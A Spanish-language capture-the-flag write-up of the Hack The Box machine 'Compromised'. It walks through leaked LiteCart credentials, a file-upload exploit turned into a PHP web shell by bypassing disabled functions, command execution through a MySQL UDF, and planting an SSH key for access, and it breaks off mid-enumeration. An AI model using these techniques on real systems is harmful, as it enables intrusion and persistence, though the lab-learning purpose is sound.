        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Compromised&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a &lt;code&gt;litercart&lt;/code&gt; que conjunto al crearnos una función propia en &lt;code&gt;php&lt;/code&gt; que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de &lt;code&gt;UDF&lt;/code&gt; en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un &lt;code&gt;rootkit&lt;/code&gt; ganar tener acceso al sistema como el usuario privilegiado &lt;code&gt;rooot&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Compromissed
❯ ls
 Compromissed
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.207
PING 10.10.10.207 (10.10.10.207) 56(84) bytes of data.
64 bytes from 10.10.10.207: icmp_seq=1 ttl=63 time=207 ms

--- 10.10.10.207 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 206.547/206.547/206.547/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.207 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:35 GMT
Initiating SYN Stealth Scan at 15:35
Scanning 10.10.10.207 [65535 ports]
Discovered open port 80/tcp on 10.10.10.207
Discovered open port 22/tcp on 10.10.10.207
Completed SYN Stealth Scan at 15:35, 26.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.207
Host is up, received user-set (0.13s latency).
Scanned at 2023-06-13 15:35:29 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.207 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:36 GMT
Nmap scan report for 10.10.10.207
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.207
http://10.10.10.207 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[/shop]
http://10.10.10.207/shop [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/], Title[301 Moved Permanently]
http://10.10.10.207/shop/ [302 Found] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/en/], X-Powered-By[LiteCart]
http://10.10.10.207/shop/en/ [200 OK] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], JQuery[3.3.1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a &lt;code&gt;Litecart&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap &lt;code&gt;http-enum&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script http-enum -p80 10.10.10.207 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:42 GMT
Nmap scan report for 10.10.10.207
Host is up (0.22s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /backup/: Backup folder w/ directory listing

Nmap done: 1 IP address (1 host up) scanned in 32.04 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Descubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre &lt;code&gt;shop&lt;/code&gt; el cual incluye a su vez varios directorios y archivos, en los cuale&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd shop
❯ ls
 admin   cache   data   ext   images   includes   logs   pages   vqmod   favicon.ico   index.php  ﮧ robots.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . -name \*config\* | xargs cat | grep -iE &quot;user|pass|key&quot;
    'name' =&amp;gt; language::translate('title_users', 'Users'),
    'default' =&amp;gt; 'users',
      'users' =&amp;gt; 'users.inc.php',
      'edit_user' =&amp;gt; 'edit_user.inc.php',
    order by priority, `key`;&quot;
      'title' =&amp;gt; language::translate('settings_group:title_'.$group['key'], $group['name']),
      'doc' =&amp;gt; $group['key'],
    $app_config['docs'][$group['key']] = 'settings.inc.php';
      'icon' =&amp;gt; 'fa-user',
      'key' =&amp;gt; 'product_modal_window',
      'key' =&amp;gt; 'sidebar_parallax_effect',
      'key' =&amp;gt; 'compact_category_tree',
      'key' =&amp;gt; 'cookie_acceptance',
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_TABLE_USERS',                             '`'. DB_DATABASE .'`.`'. DB_TABLE_PREFIX . 'users`');
 Password Encryption Salt
  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales correspondientes a la base de datos &lt;code&gt;root: changethis&lt;/code&gt; que procederemos a almancenar.&lt;/p&gt;

&lt;p&gt;Ahora podemos ver qu dentro del directorio &lt;code&gt;admin&lt;/code&gt;, vemos un archivo de nombre &lt;code&gt;login.php&lt;/code&gt;, validamos si existe una ruta correspondiente en la web y efectivamente existe.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;despues al leer el archivo &lt;code&gt;login.php&lt;/code&gt;, podemos ver que comentada una ruta oculta con un archivo txt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al validar la ruta obtenemos nuevas credenciales.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos las credenciales y nos conectamos al servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a buscar si existen vulnerabilidades asociadas a &lt;code&gt;litecart&lt;/code&gt; y vemos que existe un exploit en python2.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit litecart
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload                                                                                                               | php/webapps/45267.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos traemos el exploit y lo ejecutamos con los parametros especificos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/D5B8I.php?c=id
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;validamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por uno estatico de nombre &lt;code&gt;shell.php&lt;/code&gt; y ejecutaremos dentro del arhivo &lt;code&gt;phpinfo()&lt;/code&gt; para ver las funciones que estan desabilitadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Volvemos a ejecutar nuevamente el exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/shell.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&quot;&gt;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo &lt;code&gt;funct.php&lt;/code&gt;. Dentro lo que hace el codigo es crear una función con el nombre &lt;code&gt;pwn&lt;/code&gt;, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con &lt;code&gt;$_REQUEST['cmd]&lt;/code&gt;, para que atravez de &lt;code&gt;cmd&lt;/code&gt; pueda ejecutar instrucciones.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora modificaremos el exploit &lt;code&gt;litercart&lt;/code&gt;, para que nos suba el contenido de la nueva función creada &lt;code&gt;funct.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para simular una &lt;code&gt;tty&lt;/code&gt; utilizaremos la herramienta &lt;code&gt;tty_over_http&lt;/code&gt; de s4vitar.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp&quot;&gt;https://github.com/s4vitar/ttyoverhttp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El uso es simple solo debemos ingresar la url de nuestra shell en la solicitud &lt;code&gt;requests&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 tty_over_http.py
&amp;gt; whoami
&amp;gt; www-data
ls
&amp;gt; D5B8I.php
fmiracle.php
index.html
shell.php
python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
&amp;gt; www-data@compromised:/var/www/html/shop$
ls
&amp;gt; ls
admin  data  favicon.ico  includes   logs   robots.txt
cache  ext   images	 index.php  pages  vqmod
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recordemos que anteriormente obtuvimos credenciales de la base de datos &lt;code&gt;root:changethis&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@compromised:/var/www/html/shop$
 mysql -uroot -pchangethis -e &quot;select username, password from lc_users;&quot; ecom
&amp;lt; -e &quot;select username, password from lc_users;&quot; ecom
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+------------------------------------------------------------------+
| username | password                                                         |
+----------+------------------------------------------------------------------+
| admin    | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |
+----------+------------------------------------------------------------------+
www-data@compromised:/var/www/html/shop$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al seguir enumerando el sistema, vemos que existe un usuario &lt;code&gt;mysql&lt;/code&gt;, el cual tiene asignada una bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como el usuario &lt;code&gt;mysql&lt;/code&gt; tiene una bash podria estar relacionado a los &lt;code&gt;UDF&lt;/code&gt;, que nos permiten definir funciones especificas.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat().&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select * from mysql.func&quot;
&amp;lt;l -uroot -pchangethis -e &quot;select * from mysql.func&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.
+----------+-----+-------------+----------+
| name     | ret | dl          | type     |
+----------+-----+-------------+----------+
| exec_cmd |   0 | libmysql.so | function |
+----------+-----+-------------+----------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;vemos que existe una función definida de nombre &lt;code&gt;exec_cmd&lt;/code&gt;, que al ejecutar un comando nos lo realiza exitosamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
&amp;lt;ql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.

| exec_cmd('pwd')                                                                                                                                                                                                                                                                                                     |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| /var/lib/mysql
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No podemos entablarnos una reverse shell, pero recordemos que el puerto &lt;code&gt;22&lt;/code&gt; esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Creamos el directorio &lt;code&gt;.ssh&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
&amp;lt;-e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.

| exec_cmd('mkdir /var/lib/mysql/.ssh/')                                 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Introducimos nuestra clave privada, renombrandola como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
&amp;lt;ot@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
mysql: [Warning] Using a password on the command line interface can be insecure.
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mysql@10.10.10.207
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ whoami
mysql
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez dentro como el usuario &lt;code&gt;mysql&lt;/code&gt;, vamos a buscar de manera recursiva por la palabra &lt;code&gt;sysadmin&lt;/code&gt;, encontramos un archivo &lt;code&gt;lib/mysql/strace-log.dat&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ grep -ri &quot;sysadmin&quot; 2&amp;gt;/dev/null
log/cloud-init.log:2020-05-08 15:50:07,874 - __init__.py[DEBUG]: Adding user sysadmin
log/cloud-init.log:2020-05-08 15:50:07,874 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
log/cloud-init.log:2020-05-08 15:50:31,366 - cc_ssh_import_id.py[DEBUG]: User sysadmin is not configured for ssh_import_id
log/cloud-init-output.log:ci-info: no authorized SSH keys fingerprints found for user sysadmin.
log/installer/subiquity-debug.log.2150:2020-05-08 15:33:28,872 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '&amp;lt;REDACTED&amp;gt;'}
lib/dpkg/info/systemd.postinst:# runtime-dir/sysadmin-dir/other packages (e.g. rsyslog)
lib/dpkg/info/dash.postinst:		# The sysadmin wants it this way.  Who am I to argue?
lib/dpkg/info/libssl1.0.0:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
lib/dpkg/info/libssl1.1:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
lib/dpkg/info/irqbalance.postinst:    # things the local sysadmin has added to the old /etc/default/irqbalance
lib/dpkg/info/irqbalance.postinst:        # Insert a header to help sysadmin figure out why these things are here.
lib/dpkg/info/irqbalance.postinst:        # been added to the file by the local sysadmin.
lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited root
lib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking the
lib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadmins
